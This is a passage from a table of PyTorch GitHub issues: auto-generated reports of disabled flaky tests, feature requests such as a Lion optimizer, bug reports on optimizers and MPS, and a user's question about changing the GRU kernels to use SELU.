4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

ResponseTimeoutError: Response timeout for 5000ms, GET https://raw.githubusercontent.com/pytorch/pytorch/main/test/test_nestedtensor.py 200 (connected: true, keepalive socket: false, socketHandledRequests: 1, socketHandledResponses: 1)
headers: {""connection"":""keep-alive"",""content-length"":""138378"",""cache-control"":""max-age=300"",""content-security-policy"":""default-src 'none'; style-src 'unsafe-inline'; sandbox"",""content-type"":""text/plain; charset=utf-8"",""etag"":""\""70598adce2f7ea59edca2428ad327477a96eef2dedf5f0a03a7d6652f963cacf\"""",""strict-transport-security"":""max-age=31536000"",""x-content-type-options"":""nosniff"",""x-frame-options"":""deny"",""x-xss-protection"":""1; mode=block"",""x-github-request-id"":""B9FA:1CF1:134794:17BEC8:6536BDE5"",""accept-ranges"":""bytes"",""date"":""Mon, 23 Oct 2023 18:39:34 GMT"",""via"":""1.1 varnish"",""x-served-by"":""cache-sjc1000104-SJC"",""x-cache"":""MISS"",""x-cache-hits"":""0"",""x-timer"":""S1698086374.139982,VS0,VE192"",""vary"":""Authorization,Accept-Encoding,Origin"",""access-control-allow-origin"":""*"",""cross-origin-resource-policy"":""cross-origin"",""x-fastly-request-id"":""1296da4d8db7f56738313a7143ecc245638da458"",""expires"":""Mon, 23 Oct 2023 18:44:34 GMT"",""source-age"":""0""}

cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_nested_tensor_chunk_cpu_float64 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_nested_tensor_chunk_cpu_float64&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17948126395).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 6 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_nested_tensor_chunk_cpu_float64`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
Add regex matching to Inductor all2all collective unit tests good first issue triaged module: inductor,"As part of https://github.com/pytorch/pytorch/pull/110195, we added support for tracing and compiling all2all collectives, specifically passing in a list of integers for `input_split_sizes` / `output_split_sizes` args in `torch.ops.c10d_functional.all_to_all_single()`. And we expect that in the Inductor generated code, we are passing symints like `i0`, `i1` to the `input_split_sizes` / `output_split_sizes` args of `all_to_all_single()`. Values of these symints are not hardcoded and instead are populated at runtime.

The above mechanism already works today. But current unit tests only check if ""all_to_all_single"" exists in the generated code:
```python
FileCheck() \
.check(""all_to_all_single"") \
.run(code)
```
while the actual generated code looks like:
```python
buf5_work = dist.all_to_all_single(buf5[0], buf5_inputs[0], output_split_sizes=[i14, i15], input_split_sizes=[i12, i13], group=buf5_pg, async_op=True)
```
(notice i14, i15, i12, i13 are the symints)

We want to update the unit test code to check that symints are indeed used in `output_split_sizes` and `input_split_sizes` args, to prevent functionality regression. We want to do something similar to:
```python
FileCheck() \
.check_regex(""all_to_all_single(buf${buf_id}[0], buf${buf_id}_inputs[0], output_split_sizes=[i${symint_id_0}, i${symint_id_1}], input_split_sizes=[i${symint_id_2}, i${symint_id_3}], "") \
.run(code)
```
where the actual value of buf_id / symint_id_0 / symint_id_1 / symint_id_2 / symint_id_3 can be anything. We can likely achieve this via some sort of regular expression matching.

### Alternatives

_No response_

### Additional context

_No response_

cc @voznesenskym @penguinwu @EikanWang @jgong5 @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @wenzhe-nrv @jiayisunx @peterbell10 @ipiszy @chenyang78 @kadeng @muchulee8 @aakhundov @ColinPeppler",False
DISABLED test_nested_tensor_chunk_cpu_float32 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_nested_tensor_chunk_cpu_float32&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17941971978).

Over the past 3 hours, it has been determined flaky in 3 workflow(s) with 9 failures and 3 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_nested_tensor_chunk_cpu_float32`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

ResponseTimeoutError: Response timeout for 5000ms, GET https://raw.githubusercontent.com/pytorch/pytorch/main/test/test_nestedtensor.py -1 (connected: true, keepalive socket: false, socketHandledRequests: 1, socketHandledResponses: 0)
headers: {}

cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
Implementation of Lion Optimizer. feature module: optimizer triaged,"### üöÄ The feature, motivation and pitch

Lion Optimizer is becoming a great alterative to AdamW and Adam Optimizer. It is more efficient as it does not use second order moments and instead uses sign operations in order to update the weights. This saves on memory and decreases training time. In  some cases it is better than Adam and AdamW as given in the paper.
The original paper for this is : https://arxiv.org/pdf/2302.06675.pdf

The RFCS PR for this is: https://github.com/pytorch/rfcs/pull/60

### Alternatives

_No response_

### Additional context

_No response_

cc @vincentqb @jbschlosser @albanD @janeyx99 @crcrpar",False
Is the index_add_ function differentiable? ,"### üöÄ The feature, motivation and pitch

```python
        verts_normals = torch.zeros_like(cornea_vertex)
        vertices_faces = cornea_vertex[face_index]

        faces_normals = torch.cross(
            vertices_faces[:, 2] - vertices_faces[:, 1],
            vertices_faces[:, 0] - vertices_faces[:, 1],
            dim=-1,
        )
        unit_faces_normals = safe_normalize(faces_normals)
        verts_normals.index_add_(0, face_index[:, 0], unit_faces_normals)
        verts_normals.index_add_(0, face_index[:, 1], unit_faces_normals)
        verts_normals.index_add_(0, face_index[:, 2], unit_faces_normals)
```
### Alternatives

_No response_

### Additional context

_No response_
```[tasklist]
### Tasks
```
",False
Not Implemented Issue needs reproduction module: mps,"### üöÄ The feature, motivation and pitch

NotImplementedError: The operator 'aten::_unique2' is not currently implemented for the MPS device. If you want this op to be added in priority during the prototype phase of this feature, please comment on https://github.com/pytorch/pytorch/issues/77764. As a temporary fix, you can set the environment variable `PYTORCH_ENABLE_MPS_FALLBACK=1` to use the CPU as a fallback for this op. WARNING: this will be slower than running natively on MPS.

### Alternatives

Please add this

### Additional context

_No response_

cc @kulinseth @albanD @malfet @DenisVieriu97 @razarmehr @abhudev",False
[aotinductor] 14k models: CppCompileError: C++ compile error triaged oncall: pt2,"```
25 errors like: CppCompileError: C++ compile error (example ./generated/test_krrish94_nerf_pytorch.py:SinThetaByTheta # pytest ./generated/test_krrish94_nerf_pytorch.py -k test_001)
```

cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
[aotinductor] 14k models: TypeError: make_boxed_func..g() missing 1 required positional argument: 'args'  triaged oncall: pt2,"347 errors like: TypeError: make_boxed_func..g() missing 1 required positional argument: 'args' (example ./generated/test_ludwig_ai_ludwig.py:SequenceReducer # pytest ./generated/test_ludwig_ai_ludwig.py -k test_015)

cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
Foreach optimizers don't work with torch.set_default_dtype(torch.float64) module: optimizer,"```python
import torch

torch.set_default_dtype(torch.float64)
device = ""cuda""
model = torch.nn.Linear(200, 1, bias=True).to(device)
opt = torch.optim.Adam(model.parameters(),lr=0.001) 
x = torch.rand(1, 200).to(device)
model(x).sum().backward()
opt.step()
```
Error:
```
RuntimeError: Tensors of the same index must be on the same device and the same dtype except `step` tensors that can be CPU and float32 notwithstanding
```
Foreach is implicitly True because we are using cuda. Error goes away if we explicitly set foreach=False.

Versions: main

(originally reported [here](https://discuss.pytorch.org/t/tensors-of-the-same-index-must-be-on-the-same-device-and-the-same-dtype-except-step-tensors-that-can-be-cpu-and-float32-notwithstanding/190335/2))

cc @vincentqb @jbschlosser @albanD @janeyx99 @crcrpar",False
FSDP: clean names for use_orig_params? oncall: distributed module: fsdp,"### üöÄ The feature, motivation and pitch

When use_orig_params=True, I still get names that are prefixed with `_fsdp_wrapped_module` at each nested level. Wonder if we should just strip out the `_fsdp_wrapped_module` and return the exact original local names. 

### Alternatives

_No response_

### Additional context

_No response_

cc @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @osalpekar @jiayisuse @H-Huang @kwen2501 @awgu @penguinwu @fegin",False
DISABLED test_nested_tensor_chunk_cpu_float16 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_nested_tensor_chunk_cpu_float16&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17886253401).

Over the past 3 hours, it has been determined flaky in 5 workflow(s) with 15 failures and 5 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_nested_tensor_chunk_cpu_float16`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
There is a repeated expression and the wrong word  ,"### üìö The doc issue


> this page: <https://pytorch.org/tutorials/prototype/prototype_index.html>



<img width=""844"" alt=""image"" src=""https://github.com/pytorch/pytorch/assets/9199175/2e0fb141-32e8-41a0-995f-b128617f99ae"">


### Suggest a potential alternative/fix

_No response_",False
Status Tracker And Summary of Support Needed: Make Dynamo Generated Artifacts Debuggable triaged oncall: pt2,"Currently, dynamically translated bytecode from Dynamo can only be run as a black box. With the help of recent tools like https://github.com/thuml/depyf , it is possible to decompile bytecode into source code, and to enable debugging tools to debug those generated bytecodes.

This issue (status tracker) ducoments the progress and support needed from PyTorch side to fulfill the goal.

# General idea:

PyTorch generate bytecode (and many other artifacts) dynamically. We can decompile and dump the source code into files, let users set breakpoints, and re-run the program to hit those breakpoints.

# Main difficulty:

In essence, artifacts (transformed bytecode, compiled functions, etc.) are generated **dynamically**. We need to have a stable naming for each artifact so that users can recognize them and reuse them across runs.

# Some minor concerns:

Some function names in Dynamo are not valid (notoriously, the resume functions have `<resume in xxx>` name). We need to assign valid names for them.

# Example usage:

The main usage come from the `depyf` side. The rough idea is to set up a src directory, and dump src there for debugging.

```diff
+ import depyf
+ # set up a hook to dump src of dynamically generated artifacts
+ depyf.enable_torch_compile_debugging(dump_dir=""/path/to/dumped/src"")
def toy_example(a, b):
    x = a / (torch.abs(a) + 1)
    if b.sum() < 0:
        b = b * -1
    return x * b

for _ in range(100):
    toy_example(torch.randn(10), torch.randn(10))
```

The ideal result looks like this:

![image](https://github.com/pytorch/pytorch/assets/23236638/8f586170-7745-4cf6-9950-2d16fe831a46)

```[tasklist]
### Tasks
- [x] make code name of resume functions valid, finished in https://github.com/pytorch/pytorch/pull/111635 .
```


cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_narrow_cpu_float64 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_narrow_cpu_float64&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17880663159).

Over the past 3 hours, it has been determined flaky in 4 workflow(s) with 12 failures and 4 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_narrow_cpu_float64`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_narrow_cpu_float32 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_narrow_cpu_float32&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17867918159).

Over the past 3 hours, it has been determined flaky in 5 workflow(s) with 15 failures and 5 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_narrow_cpu_float32`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
[fx] Detecting aliasing of `fx.Node` representing `Tensor` oncall: fx,"### üöÄ The feature, motivation and pitch

One possible method is to use the fake tensor to check for aliasing

```python
TensorVariable.proxy.node.meta[‚Äòexample_value‚Äô]
```

However, for some reason, this doesn‚Äôt seem to work with `torch.vmap`:

```python
import torch

op = torch.Tensor.acos_

def fn(z):
  x = z.clone()
  result = torch.vmap(op)(x)
  assert(x is result)  # Fails in nopython=True when `is_` is implemented as testing equality of fake tensor
  
torch.compile(fn)(torch.zeros(10))

```

### Alternatives

NIL

### Additional context
Originally discovered: https://github.com/pytorch/pytorch/pull/111557#discussion_r1365886117

cc @ezyang @SherlockNoMad @EikanWang @jgong5 @wenzhe-nrv",False
Tensors in different devices module: optimizer triaged,"https://github.com/pytorch/pytorch/blob/4e310fd87521061ddc2f8e5ea93cc623563929cb/torch/optim/adam.py#L108-L108

torch+cu118-2.1.0, Ubuntu 22.04.2 LTS

When the device of params and grads is `cuda:0`, the device of `state_steps` is still `cpu`. This leads to an error:

```
Tensors of the same index must be on the same device and the same dtype except step tensors that can be CPU and float32 notwithstanding.
```

Unfortunately, I cannot provide a minimum replication, because this problem only occurs when I use [gcastle](https://github.com/huawei-noah/trustworthyAI/blob/master/gcastle/README.md) package. After debugging, I'm sure this problem is caused by the pytorch Adam optimizer.

```
from castle.algorithms import *
model = DAG_GNN(device_type='gpu', batch_size=3500, device_ids=0)
model.learn(x)
```

where `x` is any random numpy matrix, for example shape [2000, 13].

My suggestion is using `torch.tensor(0., device=p.device)` in `adam.py` Ln.108. Because in Ln.106 there is the same usage, I think it will not cause problem.

cc @vincentqb @jbschlosser @albanD @janeyx99 @crcrpar",False
DISABLED test_narrow_cpu_float16 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_narrow_cpu_float16&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17849375503).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 6 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_narrow_cpu_float16`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
[dynamo] Implement `set.__contains__` for tensors based on object identity oncall: pt2,"### üöÄ The feature, motivation and pitch

Workaround to https://github.com/pytorch/pytorch/issues/111544 for `set.__contains__` case

### Alternatives

_No response_

### Additional context

Related https://github.com/pytorch/pytorch/issues/111550

cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_detach_cpu_float64 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_detach_cpu_float64&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17842173875).

Over the past 3 hours, it has been determined flaky in 4 workflow(s) with 12 failures and 4 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_detach_cpu_float64`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_Conv2d_naive_groups_cuda_float16 (__main__.TestConvolutionNNDeviceTypeCUDA) module: rocm triaged skipped,"Platforms: rocm

Failure observed in ROCm5.7 CI upgrade PR, so skipping until resolved: https://github.com/pytorch/pytorch/pull/110465#issuecomment-1758427256

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False
DISABLED test_Conv2d_groups_nobias_v2 (__main__.TestConvolutionNN) module: rocm triaged skipped,"Platforms: rocm

Failure observed in ROCm5.7 CI upgrade PR, so skipping until resolved: https://github.com/pytorch/pytorch/pull/110465#issuecomment-1758427256

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False
DISABLED test_Conv2d_groups_nobias (__main__.TestConvolutionNN) module: rocm triaged skipped,"Platforms: rocm

Failure observed in ROCm5.7 CI upgrade PR, so skipping until resolved: https://github.com/pytorch/pytorch/pull/110465#issuecomment-1758427256

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False
UNSTABLE rocm / linux-focal-rocm5.6-py3.8 / test (default) module: rocm module: ci unstable ciflow/rocm,"ROCm job is broken after https://github.com/pytorch/pytorch/pull/111381.  AMD is looking into it (I assume).  Ping me if you want to revert.

cc @jeffdaily @sunway513 @jithunnair-amd @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang @seemethere @malfet @pytorch/pytorch-dev-infra",False
DISABLED test_detach_cpu_float32 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_detach_cpu_float32&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17831419866).

Over the past 3 hours, it has been determined flaky in 4 workflow(s) with 12 failures and 4 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_detach_cpu_float32`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305",False
Implementation Of SeLU in New Gate of GRU with CUDA - PyTorch Source ,"I want to change the activation function in GRU architecture i.e. For newgate i wanted to replace tanh with selu activation function, somehow i successfully did it by changing file RNN.cpp in aten/src/ATen/native/Rnn.cpp, but on testing i found that it was only working on CPU not for the GPU. On Cuda input it was generating the same output as with tanh. Can someone help me to find the actual file where the cuda implementation of GRU lies. Here is the modified struct used in RNN.cpp that is working on CPU only

```
Tensor applySelu(Tensor new_gate)
  {
    torch::Tensor input = (torch::Tensor) new_gate;
    torch::Tensor result = torch::selu(input);
    const Tensor result_return = (Tensor) result;
    return result_return;
  }

template <typename cell_params>
struct GRUCell : Cell<Tensor, cell_params> {
  using hidden_type = Tensor;

  hidden_type operator()(
      const Tensor& input,
      const hidden_type& hidden,
      const cell_params& params,
      bool pre_compute_input = false) const override {
    if (input.is_cuda() || input.is_xpu()) {
      TORCH_CHECK(!pre_compute_input);
      auto igates = params.matmul_ih(input);
      auto hgates = params.matmul_hh(hidden);
      auto result = at::_thnn_fused_gru_cell(
          igates, hgates, hidden, params.b_ih(), params.b_hh());
      // Slice off the workspace argument (it's needed only for AD).
      return std::move(std::get<0>(result));
    }
    const auto chunked_igates = pre_compute_input
        ? input.unsafe_chunk(3, 1)
        : params.linear_ih(input).unsafe_chunk(3, 1);
    auto chunked_hgates = params.linear_hh(hidden).unsafe_chunk(3, 1);
    const auto reset_gate =
        chunked_hgates[0].add_(chunked_igates[0]).sigmoid_();
    const auto input_gate =
        chunked_hgates[1].add_(chunked_igates[1]).sigmoid_();
    const auto new_gate =
        chunked_igates[2].add(chunked_hgates[2].mul_(reset_gate));
    const auto test_gate = applySelu(new_gate);
    return (hidden - test_gate).mul_(input_gate).add_(test_gate);
  }
};
```

I also found a cuda file named RNN.cu in aten/src/ATen/native/cuda/RNN.cu, also modified it with selu but didn't get the relevant output.Here is the code from that file.

```
template<typename T>
__device__ __forceinline__
T selu(T x) {
  T alpha = static_cast<T>(1.67326);
  T scale = static_cast<T>(1.0507);
  return (x > 0) ? (scale * x) : (scale * alpha * (::exp(x) - static_cast<T>(1)));
}


template <typename scalar_t, typename accscalar_t, typename index_type, int indexing_kind>
#if __CUDA_ARCH__ >= 350 || defined(USE_ROCM)
C10_LAUNCH_BOUNDS_2(512, 4)
#endif
__global__ void gru_cell_forward(
            TensorInfo<scalar_t, index_type> Input,
            TensorInfo<scalar_t, index_type> Hidden,
            TensorInfo<scalar_t, index_type> Bias1,
            TensorInfo<scalar_t, index_type> Bias2,
            TensorInfo<scalar_t, index_type> _hx,
            TensorInfo<scalar_t, index_type> _hy,
            TensorInfo<scalar_t, index_type> storage,
            index_type hsz,
            index_type totalElements) {
  bool has_bias = Bias1.data != nullptr;
  for (index_type linearIndex = blockIdx.x * blockDim.x + threadIdx.x;
       linearIndex < totalElements;
       linearIndex += gridDim.x * blockDim.x) {
      index_type offset = (linearIndex/hsz)*3*hsz+linearIndex%hsz;

      scalar_t ir = DEVICE_LINEAR_GET(Input, offset+0*hsz);
      scalar_t ii = DEVICE_LINEAR_GET(Input, offset+1*hsz);
      scalar_t in = DEVICE_LINEAR_GET(Input, offset+2*hsz);
      scalar_t hr = DEVICE_LINEAR_GET(Hidden,offset+0*hsz);
      scalar_t hi = DEVICE_LINEAR_GET(Hidden,offset+1*hsz);
      scalar_t hn = DEVICE_LINEAR_GET(Hidden,  offset+2*hsz);

      scalar_t hx = DEVICE_LINEAR_GET(_hx, linearIndex);
      scalar_t* hy = &DEVICE_LINEAR_GET(_hy, linearIndex);

      scalar_t b1r, b1i, b1n, b2r, b2i, b2n;

      if (has_bias) {
        b1r = DEVICE_BIAS_GET(Bias1, linearIndex%hsz+0*hsz);
        b1i = DEVICE_BIAS_GET(Bias1, linearIndex%hsz+1*hsz);
        b1n = DEVICE_BIAS_GET(Bias1, linearIndex%hsz+2*hsz);

        b2r = DEVICE_BIAS_GET(Bias2, linearIndex%hsz+0*hsz);
        b2i = DEVICE_BIAS_GET(Bias2, linearIndex%hsz+1*hsz);
        b2n = DEVICE_BIAS_GET(Bias2, linearIndex%hsz+2*hsz);
      } else {
#ifndef THC_REAL_IS_HALF
        b1r = 0.0; b1i = 0.0; b1n = 0.0;
        b2r = 0.0; b2i = 0.0; b2n = 0.0;
#else
        b1r = F2H(0.0); b1i = F2H(0.0); b1n = F2H(0.0);
        b2r = F2H(0.0); b2i = F2H(0.0); b2n = F2H(0.0);
#endif
      }

      offset = (linearIndex/hsz)*5*hsz+linearIndex%hsz;

      accscalar_t rg, ig, ng;

      rg = sigmoid(H2F(ir) + H2F(hr) + H2F(b1r) + H2F(b2r));
      ig = sigmoid(H2F(ii) + H2F(hi) + H2F(b1i) + H2F(b2i));

      ng = H2F(in) + H2F(b1n) + rg*( H2F(hn)+H2F(b2n) );
      
      //ng = ::tanh(ng);
      ng = selu(ng);
      *hy = F2H( ng + ig * ( H2F(hx)-ng ) );

      //SAVE FOR BACKWARDS
      DEVICE_LINEAR_GET(storage, offset+0*hsz) = F2H(rg);
      DEVICE_LINEAR_GET(storage, offset+1*hsz) = F2H(ig);
      DEVICE_LINEAR_GET(storage, offset+2*hsz) = F2H(ng);
      DEVICE_LINEAR_GET(storage, offset+3*hsz) = hx;
      DEVICE_LINEAR_GET(storage, offset+4*hsz) = F2H(H2F(hn) + H2F(b2n));
    }
}
```

- I have Applied the print statements in the first RNN.cpp file got to know that if condition is not being true on GPU as well.

- Even the modified cuda file is not being invoked as per my understanding because the output is same as on default architecture with tanh.",False
DISABLED test_check_inplace_nn_CELU_mps_float32 (__main__.TestModuleMPS) triaged module: macos skipped module: mps,"Platforms: mac, macos

This test was disabled because it is failing on main branch ([recent examples](http://torch-ci.com/failure/test_modules.py%3A%3ATestModuleMPS%3A%3Atest_check_inplace_nn_CELU_mps_float32)).

This test has been failing in MacOS x86 for a while https://hud.pytorch.org/pytorch/pytorch/commit/973c87b320b5e7489f18b719d5b1c57a2051ae10.  The error is:

```
RuntimeError: MPS backend out of memory (MPS allocated: 0 bytes, other allocations: 0 bytes, max allowed: 1.70 GB). Tried to allocate 0 bytes on private pool. Use PYTORCH_MPS_HIGH_WATERMARK_RATIO=0.0 to disable upper limit for memory allocations (may cause system failure).
```

cc @kulinseth @albanD @malfet @DenisVieriu97 @razarmehr @abhudev",False
DISABLED test_fsdp_tp_integration_tensor_parallel_size_2_cpu_offload_CPUOffload(offload_params=False) (__main__.TestTPFSDPIntegration) oncall: distributed skipped,"Platforms: linux

This test was disabled because it is failing on main branch ([recent examples](http://torch-ci.com/failure/distributed%2Ffsdp%2Ftest_fsdp_tp_integration.py%3A%3ATestTPFSDPIntegration%3A%3Atest_fsdp_tp_integration_tensor_parallel_size_2_cpu_offload_CPUOffload(offload_params%3DFalse))).

The bisection shows #111160 to be the culprit, but @fduwjj hasn't been able to reproduce it locally. 

cc @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @osalpekar @jiayisuse @H-Huang @kwen2501 @awgu @penguinwu @wanchaol ",False
DISABLED test_fused_int_mm_mul_gating (__main__.TestPaternMatcher) module: rocm triaged module: flaky-tests skipped module: inductor,"Platforms: rocm

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/failure/test_fused_int_mm_mul_gating) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17728965207).

Over the past 72 hours, it has flakily failed in 6 workflow(s).

**Debugging instructions (after clicking on the recent samples link):**
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Grep for `test_fused_int_mm_mul_gating`


Test file path: `inductor/test_pattern_matcher.py`

cc @jeffdaily @sunway513 @jithunnair-amd @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang @voznesenskym @penguinwu @EikanWang @jgong5 @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @wenzhe-nrv @jiayisunx @peterbell10 @ipiszy @yf225 @chenyang78 @kadeng @muchulee8 @aakhundov @ColinPeppler",False
DISABLED test_fused_int_mm_mul (__main__.TestPaternMatcher) module: rocm triaged module: flaky-tests skipped module: inductor,"Platforms: rocm

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/failure/test_fused_int_mm_mul) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17711524027).

Over the past 72 hours, it has flakily failed in 12 workflow(s).

**Debugging instructions (after clicking on the recent samples link):**
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Grep for `test_fused_int_mm_mul`


Test file path: `inductor/test_pattern_matcher.py`

cc @jeffdaily @sunway513 @jithunnair-amd @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang @voznesenskym @penguinwu @EikanWang @jgong5 @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @Xia-Weiwen @wenzhe-nrv @jiayisunx @peterbell10 @ipiszy @yf225 @chenyang78 @kadeng @muchulee8 @aakhundov @ColinPeppler",False
